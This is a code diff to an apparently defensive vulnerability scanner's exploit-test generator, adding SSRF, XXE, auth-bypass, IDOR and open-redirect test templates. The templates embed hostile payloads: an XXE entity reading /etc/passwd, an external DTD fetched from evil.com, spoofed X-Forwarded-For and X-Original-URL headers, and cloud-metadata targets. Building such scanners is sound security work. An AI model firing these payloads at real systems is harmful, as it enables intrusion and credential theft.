@@ -2,10 +2,23 @@
  * Layer 5: Exploit Test Generator
  * 
  * Generates executable exploit tests for specific vulnerability types.
+ * Uses comprehensive payload library with mutation support.
  */
 
 import type { Gap } from "../core/scanner/types.js";
 import type { ExecutionLanguage } from "./types.js";
+import {
+  SQL_INJECTION_PAYLOADS,
+  XSS_PAYLOADS,
+  COMMAND_INJECTION_PAYLOADS,
+  PATH_TRAVERSAL_PAYLOADS,
+  SSRF_PAYLOADS,
+  XXE_PAYLOADS,
+  AUTH_BYPASS_PAYLOADS,
+  IDOR_PAYLOADS,
+  OPEN_REDIRECT_PAYLOADS,
+  getPayloadsWithMutations,
+} from "./payloads.js";
 
 /**
  * Generate exploit test code for a gap
@@ -27,6 +40,16 @@ export function generateExploitTest(
       return generateCommandInjectionTest(gap, targetCode, language);
     case "path-traversal":
       return generatePathTraversalTest(gap, targetCode, language);
+    case "ssrf":
+      return generateSsrfTest(gap, targetCode, language);
+    case "xxe":
+      return generateXxeTest(gap, targetCode, language);
+    case "missing-authentication":
+      return generateAuthBypassTest(gap, targetCode, language);
+    case "idor":
+      return generateIdorTest(gap, targetCode, language);
+    case "open-redirect":
+      return generateOpenRedirectTest(gap, targetCode, language);
     default:
       return generateGenericTest(gap, targetCode, language);
   }
@@ -301,6 +324,301 @@ describe('Path Traversal Exploit - ${gap.filePath}:${gap.lineStart}', () => {
     if (usesPath) {
       expect(hasProtection).toBe(false);
     }
+  });
+});
+`.trim();
+}
+
+/**
+ * Generate SSRF exploit test
+ */
+function generateSsrfTest(
+  gap: Gap,
+  targetCode: string,
+  language: ExecutionLanguage
+): string {
+  const payloads = JSON.stringify(SSRF_PAYLOADS.localhost.slice(0, 5));
+  const cloudPayloads = JSON.stringify(SSRF_PAYLOADS.cloud.slice(0, 3));
+  
+  return `
+import { describe, it, expect } from 'vitest';
+
+describe('SSRF Exploit - ${gap.filePath}:${gap.lineStart}', () => {
+  const LOCALHOST_PAYLOADS = ${payloads};
+  const CLOUD_METADATA_PAYLOADS = ${cloudPayloads};
+
+  it('exploit: internal network access via localhost variants', () => {
+    const targetCode = \`${escapeTemplate(targetCode)}\`;
+    
+    // Check if URL is fetched without validation
+    const usesFetch = targetCode.includes('fetch(') ||
+                      targetCode.includes('axios') ||
+                      targetCode.includes('request(') ||
+                      targetCode.includes('http.get');
+    
+    const hasUrlValidation = targetCode.includes('allowlist') ||
+                             targetCode.includes('whitelist') ||
+                             targetCode.includes('isValidUrl') ||
+                             targetCode.includes('URL(');
+    
+    // Vulnerable: fetches URLs without validation
+    if (usesFetch) {
+      expect(hasUrlValidation).toBe(false);
+    }
+  });
+
+  it('exploit: cloud metadata endpoint access', () => {
+    const targetCode = \`${escapeTemplate(targetCode)}\`;
+    
+    // AWS/GCP/Azure metadata endpoints should be blocked
+    const blocksMetadata = targetCode.includes('169.254.169.254') ||
+                           targetCode.includes('metadata.google') ||
+                           targetCode.includes('blockInternal');
+    
+    expect(blocksMetadata).toBe(false);
+  });
+
+  it('exploit: protocol smuggling (file://, gopher://)', () => {
+    const targetCode = \`${escapeTemplate(targetCode)}\`;
+    
+    // Check if non-HTTP protocols are allowed
+    const restrictsProtocol = targetCode.includes('http://') ||
+                              targetCode.includes('https://') ||
+                              targetCode.includes('protocol === "http"');
+    
+    // Vulnerable if no protocol restriction
+    expect(restrictsProtocol).toBe(false);
+  });
+});
+`.trim();
+}
+
+/**
+ * Generate XXE exploit test
+ */
+function generateXxeTest(
+  gap: Gap,
+  targetCode: string,
+  language: ExecutionLanguage
+): string {
+  return `
+import { describe, it, expect } from 'vitest';
+
+describe('XXE Exploit - ${gap.filePath}:${gap.lineStart}', () => {
+  const XXE_PAYLOADS = [
+    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
+    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]><root></root>',
+  ];
+
+  it('exploit: XML parser allows external entities', () => {
+    const targetCode = \`${escapeTemplate(targetCode)}\`;
+    
+    // Check for XML parsing
+    const parsesXml = targetCode.includes('parseXML') ||
+                      targetCode.includes('DOMParser') ||
+                      targetCode.includes('xml2js') ||
+                      targetCode.includes('xmldom') ||
+                      targetCode.includes('XMLParser') ||
+                      targetCode.includes('parseString');
+    
+    // Check for XXE protection
+    const hasProtection = targetCode.includes('noent: false') ||
+                          targetCode.includes('NOENT') ||
+                          targetCode.includes('disallow-doctype-decl') ||
+                          targetCode.includes('external-general-entities');
+    
+    // Vulnerable: parses XML without XXE protection
+    if (parsesXml) {
+      expect(hasProtection).toBe(false);
+    }
+  });
+
+  it('exploit: DTD processing enabled', () => {
+    const targetCode = \`${escapeTemplate(targetCode)}\`;
+    
+    // DTD processing should be disabled
+    const disablesDtd = targetCode.includes('DOCTYPE') &&
+                        (targetCode.includes('false') || targetCode.includes('reject'));
+    
+    expect(disablesDtd).toBe(false);
+  });
+});
+`.trim();
+}
+
+/**
+ * Generate authentication bypass exploit test
+ */
+function generateAuthBypassTest(
+  gap: Gap,
+  targetCode: string,
+  language: ExecutionLanguage
+): string {
+  const defaultCreds = JSON.stringify(AUTH_BYPASS_PAYLOADS.defaultCreds.slice(0, 3));
+  
+  return `
+import { describe, it, expect } from 'vitest';
+
+describe('Auth Bypass Exploit - ${gap.filePath}:${gap.lineStart}', () => {
+  const DEFAULT_CREDENTIALS = ${defaultCreds};
+  
+  const BYPASS_HEADERS = [
+    { 'X-Forwarded-For': '127.0.0.1' },
+    { 'X-Original-URL': '/admin' },
+    { 'X-Custom-IP-Authorization': '127.0.0.1' },
+  ];
+
+  it('exploit: missing authentication check', () => {
+    const targetCode = \`${escapeTemplate(targetCode)}\`;
+    
+    // Check for auth middleware/guards
+    const hasAuthCheck = targetCode.includes('isAuthenticated') ||
+                         targetCode.includes('requireAuth') ||
+                         targetCode.includes('verifyToken') ||
+                         targetCode.includes('passport.') ||
+                         targetCode.includes('authMiddleware') ||
+                         targetCode.includes('session.user');
+    
+    // Vulnerable: no authentication check
+    expect(hasAuthCheck).toBe(false);
+  });
+
+  it('exploit: authorization bypass via header injection', () => {
+    const targetCode = \`${escapeTemplate(targetCode)}\`;
+    
+    // Check if X-Forwarded-For is trusted
+    const trustsForwardedHeaders = targetCode.includes('x-forwarded-for') ||
+                                   targetCode.includes('X-Forwarded-For') ||
+                                   targetCode.includes('trust proxy');
+    
+    const validatesSource = targetCode.includes('validateIP') ||
+                            targetCode.includes('allowedIPs');
+    
+    // Vulnerable if trusts headers without validation
+    if (trustsForwardedHeaders) {
+      expect(validatesSource).toBe(false);
+    }
+  });
+
+  it('exploit: JWT algorithm confusion', () => {
+    const targetCode = \`${escapeTemplate(targetCode)}\`;
+    
+    // Check for JWT handling
+    const handlesJwt = targetCode.includes('jwt.verify') ||
+                       targetCode.includes('jsonwebtoken') ||
+                       targetCode.includes('jose');
+    
+    // Check if algorithm is enforced
+    const enforcesAlgorithm = targetCode.includes('algorithms:') ||
+                              targetCode.includes('HS256') ||
+                              targetCode.includes('RS256');
+    
+    // Vulnerable if JWT used without algorithm enforcement
+    if (handlesJwt) {
+      expect(enforcesAlgorithm).toBe(true);
+    }
+  });
+});
+`.trim();
+}
+
+/**
+ * Generate IDOR exploit test
+ */
+function generateIdorTest(
+  gap: Gap,
+  targetCode: string,
+  language: ExecutionLanguage
+): string {
+  return `
+import { describe, it, expect } from 'vitest';
+
+describe('IDOR Exploit - ${gap.filePath}:${gap.lineStart}', () => {
+  const ID_PAYLOADS = ['1', '2', '0', '-1', '9999999', '1000000000'];
+
+  it('exploit: direct object reference without ownership check', () => {
+    const targetCode = \`${escapeTemplate(targetCode)}\`;
+    
+    // Check for ID usage
+    const usesId = targetCode.includes('params.id') ||
+                   targetCode.includes('req.params') ||
+                   targetCode.includes('userId') ||
+                   targetCode.includes('resourceId');
+    
+    // Check for ownership validation
+    const checksOwnership = targetCode.includes('user.id ===') ||
+                            targetCode.includes('userId ===') ||
+                            targetCode.includes('belongsTo') ||
+                            targetCode.includes('isOwner') ||
+                            targetCode.includes('canAccess');
+    
+    // Vulnerable: uses ID without ownership check
+    if (usesId) {
+      expect(checksOwnership).toBe(false);
+    }
+  });
+
+  it('exploit: sequential/predictable IDs', () => {
+    const targetCode = \`${escapeTemplate(targetCode)}\`;
+    
+    // Check for UUID usage (more secure)
+    const usesUuid = targetCode.includes('uuid') ||
+                     targetCode.includes('UUID') ||
+                     targetCode.includes('uuidv4');
+    
+    // Using sequential IDs is vulnerable
+    expect(usesUuid).toBe(false);
+  });
+});
+`.trim();
+}
+
+/**
+ * Generate open redirect exploit test
+ */
+function generateOpenRedirectTest(
+  gap: Gap,
+  targetCode: string,
+  language: ExecutionLanguage
+): string {
+  const payloads = JSON.stringify(OPEN_REDIRECT_PAYLOADS.bypass.slice(0, 5));
+  
+  return `
+import { describe, it, expect } from 'vitest';
+
+describe('Open Redirect Exploit - ${gap.filePath}:${gap.lineStart}', () => {
+  const REDIRECT_PAYLOADS = ${payloads};
+
+  it('exploit: unvalidated redirect URL', () => {
+    const targetCode = \`${escapeTemplate(targetCode)}\`;
+    
+    // Check for redirect
+    const hasRedirect = targetCode.includes('redirect(') ||
+                        targetCode.includes('res.redirect') ||
+                        targetCode.includes('location.href') ||
+                        targetCode.includes('window.location');
+    
+    // Check for URL validation
+    const validatesUrl = targetCode.includes('allowedUrls') ||
+                         targetCode.includes('whitelist') ||
+                         targetCode.includes('startsWith("/")') ||
+                         targetCode.includes('isRelative') ||
+                         targetCode.includes('isSameDomain');
+    
+    // Vulnerable: redirects without validation
+    if (hasRedirect) {
+      expect(validatesUrl).toBe(false);
+    }
+  });
+
+  it('exploit: protocol-relative URL bypass', () => {
+    const targetCode = \`${escapeTemplate(targetCode)}\`;
+    
+    // Check if // URLs are blocked
+    const blocksProtocolRelative = targetCode.includes('startsWith("//")') ||
+                                   targetCode.includes('/^\\\\/\\\\//');
+    
+    expect(blocksProtocolRelative).toBe(false);
   });
 });
 `.trim();
